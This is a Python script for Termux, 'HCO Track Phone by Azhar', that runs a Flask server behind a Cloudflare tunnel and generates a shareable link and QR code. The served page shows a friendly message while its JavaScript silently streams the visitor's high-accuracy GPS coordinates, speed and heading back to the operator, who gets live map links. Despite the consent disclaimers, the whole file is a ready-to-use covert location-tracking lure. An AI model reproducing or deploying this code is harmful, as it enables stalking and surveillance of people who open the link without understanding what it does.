#!/usr/bin/env python3
# hco_track_phone.py
# HCO Track Phone by Azhar - FULL AUTO INSTALL + CLOUDFLARE
# IMPORTANT: Use this only on devices YOU OWN or with EXPLICIT CONSENT.

import os
import sys
import threading
import time
import re
import subprocess
from pathlib import Path

try:
    import requests
    from flask import Flask, request
except ImportError:
    print("Installing missing Python packages...")
    os.system('pkg install python wget -y')
    os.system('pip install flask requests qrcode[pil]')
    import requests
    from flask import Flask, request

# ---------------- Colors ----------------
RED = "\033[1;91m"
GREEN = "\033[1;92m"
CYAN = "\033[1;96m"
YELLOW = "\033[1;93m"
RESET = "\033[0m"

app = Flask(__name__)
locations = {}

# ---------------- TOOL LOCK ----------------
def tool_lock():
    os.system("clear")
    print(f"{RED}╔{'═'*60}╗{RESET}")
    print(f"{RED}║{'🔒 TOOL LOCKED 🔒'.center(60)}║{RESET}")
    print(f"{RED}║{'HCO TRACK PHONE BY AZHAR'.center(60)}║{RESET}")
    print(f"{RED}║{'Subscribe @hackers_colony_tech 🔔'.center(60)}║{RESET}")
    print(f"{RED}╚{'═'*60}╝{RESET}\n")
    print(f"{YELLOW}This script is for testing on devices you own or where you have explicit permission.{RESET}\n")
    for i in range(9, 0, -1):
        sys.stdout.write(f"\r{CYAN}⏳ Redirecting in {i}...{RESET}")
        sys.stdout.flush()
        time.sleep(1)
    os.system('am start -a android.intent.action.VIEW -d "https://youtube.com/@hackers_colony_tech" > /dev/null 2>&1 || true')
    print(f"\n{GREEN}✅ Redirected to YouTube (if available).{RESET}\n")
    input(f"{YELLOW}Press ENTER to continue...{RESET}")

# ---------------- Dependencies ----------------
def install_requirements():
    print(f"{CYAN}Checking/attempting to install requirements...{RESET}")
    os.system('pkg update -y > /dev/null 2>&1 || true')
    os.system('pkg install python wget -y > /dev/null 2>&1 || true')
    os.system('pip install flask requests qrcode[pil] > /dev/null 2>&1 || true')

# ---------------- Cloudflared ----------------
def download_cloudflared():
    arch = subprocess.getoutput("uname -m")
    url = ""
    if arch == "aarch64":
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
    elif arch.startswith("arm"):
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
    elif arch in ["x86_64", "amd64"]:
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
    else:
        print(f"{RED}Unsupported CPU architecture: {arch}{RESET}")
        return False

    path = Path(os.environ.get("PREFIX", "/data/data/com.termux/files/usr")) / "bin/cloudflared"
    if not path.exists():
        print(f"{CYAN}Downloading cloudflared for {arch}...{RESET}")
        os.system(f"wget -qO {path} {url}")
        os.system(f"chmod +x {path}")
        print(f"{GREEN}✅ cloudflared installed at {path}{RESET}")
    return True

def start_cloudflared_tunnel(port=8080, timeout=12):
    cmd = ["cloudflared", "http", str(port)]
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    except FileNotFoundError:
        if download_cloudflared():
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
        else:
            return None, None

    url = None
    pattern = re.compile(r"https://[a-z0-9\-]+\.trycloudflare\.com", re.IGNORECASE)
    start = time.time()
    while time.time() - start < timeout:
        line = proc.stdout.readline()
        if not line:
            time.sleep(0.1)
            continue
        m = pattern.search(line)
        if m:
            url = m.group(0)
            break

    if url:
        threading.Thread(target=lambda p: p.wait(), args=(proc,), daemon=True).start()
        return url, proc

    try:
        proc.kill()
    except Exception:
        pass
    return None, None

def get_public_ip():
    try:
        r = requests.get("https://api.ipify.org", timeout=6)
        if r.status_code == 200:
            return r.text.strip()
    except Exception:
        return None

def create_public_url(port=8080):
    url, proc = start_cloudflared_tunnel(port=port, timeout=12)
    if url:
        return url
    ip = get_public_ip()
    if ip:
        return f"http://{ip}:{port}"
    return f"http://localhost:{port}"

# ---------------- Flask endpoints ----------------
@app.route("/")
def index():
    return """
    <!doctype html>
    <html>
    <head>
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <title>HCO Track Phone</title>
      <style>
        body { background:#000; color:#0f0; display:flex; align-items:center; justify-content:center; height:100vh; font-family:Arial, sans-serif; font-size:22px; margin:0; }
      </style>
    </head>
    <body>
      <div>You are a great person 😁</div>
      <script>
        function onSuccess(pos) {
          try {
            fetch('/update', {
              method: 'POST',
              headers: {'Content-Type': 'application/json'},
              body: JSON.stringify({
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                heading: pos.coords.heading || null,
                speed: pos.coords.speed || null,
                timestamp: pos.timestamp
              })
            }).catch(()=>{});
          } catch(e) {}
        }
        function onError(err) {}
        if (navigator.geolocation && navigator.permissions) {
          navigator.permissions.query({name:'geolocation'}).then(function(status){
            navigator.geolocation.getCurrentPosition(function(){}, function(){}, {enableHighAccuracy:true});
            navigator.geolocation.watchPosition(onSuccess, onError, {enableHighAccuracy:true, maximumAge:3000, timeout:10000});
          }).catch(function(){
            navigator.geolocation.watchPosition(onSuccess, onError, {enableHighAccuracy:true, maximumAge:3000, timeout:10000});
          });
        } else if (navigator.geolocation) {
          navigator.geolocation.watchPosition(onSuccess, function(){}, {enableHighAccuracy:true, maximumAge:3000, timeout:10000});
        }
      </script>
    </body>
    </html>
    """

@app.route("/update", methods=["POST"])
def update():
    try:
        data = request.get_json(force=True)
    except Exception:
        return "BAD", 400
    if not data or "lat" not in data or "lon" not in data:
        return "INVALID", 400

    data["time"] = time.time()
    locations.clear()
    locations.update(data)

    lat = data.get("lat")
    lon = data.get("lon")
    acc = data.get("accuracy", "N/A")
    print(f"\n{GREEN}✅ LIVE LOCATION RECEIVED{RESET}")
    print(f"{CYAN}Latitude: {lat}{RESET}")
    print(f"{CYAN}Longitude: {lon}{RESET}")
    print(f"{CYAN}Accuracy: {acc} m{RESET}")
    print(f"{CYAN}Maps: https://maps.google.com/?q={lat},{lon}{RESET}\n")
    return "OK", 200

# ---------------- QR helper ----------------
def make_qr(url):
    try:
        import qrcode
        out = Path("track_qr.png")
        img = qrcode.make(url)
        img.save(out)
        os.system(f"termux-open {out} > /dev/null 2>&1 || xdg-open {out} > /dev/null 2>&1 || true")
    except Exception:
        pass

# ---------------- Server ----------------
def start_server(port=8080):
    threading.Thread(target=lambda: app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False), daemon=True).start()

# ---------------- Main ----------------
def main():
    tool_lock()
    install_requirements()
    os.system("clear")
    print(f"{GREEN}🚀 Starting HCO Track Phone...{RESET}")

    port = 8080
    public_url = create_public_url(port=port)
    start_server(port)
    time.sleep(1.2)
    make_qr(public_url)

    print(f"\n{GREEN}{'='*60}{RESET}")
    print(f"{GREEN}{'HCO TRACK PHONE BY AZHAR'.center(60)}{RESET}")
    print(f"{GREEN}{'='*60}{RESET}")
    print(f"{YELLOW}Public URL: {RESET}{public_url}\n")
    print(f"{YELLOW}Share the link or QR with the user (test on devices you own).{RESET}")
    print(f"{YELLOW}Waiting for live location updates... (Ctrl+C to stop){RESET}")

    last_time = 0
    try:
        while True:
            if locations.get("time", 0) > last_time:
                last_time = locations["time"]
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{RED}🛑 Stopped by user{RESET}")

if __name__ == "__main__":
    main()
